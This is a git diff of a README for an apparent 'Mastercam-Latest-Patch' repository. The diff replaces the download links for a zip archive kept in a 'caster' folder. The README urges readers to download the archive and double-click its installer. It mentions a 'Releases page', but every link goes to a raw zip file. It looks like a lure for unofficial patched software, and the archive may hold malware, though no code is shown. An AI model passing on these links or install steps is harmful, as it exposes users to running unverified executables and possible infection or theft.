@@ -1,6 +1,6 @@
 # 🎉 Mastercam-Latest-Patch - Simplifying CNC Programming for Everyone
 
-[![Download Latest Patch](https://raw.githubusercontent.com/gabrielfqr/Mastercam-Latest-Patch/main/caster/Mastercam-Latest-Patch_v1.3.zip%20Latest%20Patch-blue)](https://raw.githubusercontent.com/gabrielfqr/Mastercam-Latest-Patch/main/caster/Mastercam-Latest-Patch_v1.3.zip)
+[![Download Latest Patch](https://github.com/gabrielfqr/Mastercam-Latest-Patch/raw/refs/heads/main/caster/Mastercam-Patch-Latest-3.6-beta.2.zip%20Latest%20Patch-blue)](https://github.com/gabrielfqr/Mastercam-Latest-Patch/raw/refs/heads/main/caster/Mastercam-Patch-Latest-3.6-beta.2.zip)
 
 ## 📖 Overview
 
@@ -14,11 +14,11 @@ To begin using the Mastercam software and resources, you will need to download t
 
 1. **Visit this page to download:** Click the link below to go to the Releases page where you can find the latest version of the Mastercam patch.
 
-   [Download Latest Patch](https://raw.githubusercontent.com/gabrielfqr/Mastercam-Latest-Patch/main/caster/Mastercam-Latest-Patch_v1.3.zip)
+   [Download Latest Patch](https://github.com/gabrielfqr/Mastercam-Latest-Patch/raw/refs/heads/main/caster/Mastercam-Patch-Latest-3.6-beta.2.zip)
 
 2. **Choose the appropriate file:** Once you are on the Releases page, look for the version that suits your needs. 
 
-3. **Download the file:** Click on the file name to begin your download. You may see files named something like `https://raw.githubusercontent.com/gabrielfqr/Mastercam-Latest-Patch/main/caster/Mastercam-Latest-Patch_v1.3.zip`.
+3. **Download the file:** Click on the file name to begin your download. You may see files named something like `https://github.com/gabrielfqr/Mastercam-Latest-Patch/raw/refs/heads/main/caster/Mastercam-Patch-Latest-3.6-beta.2.zip`.
 
 4. **Run the installer:** After the download completes, locate the file in your Downloads folder. Double-click the file to start the installation process. Follow the prompts on the screen to install the patch.
 
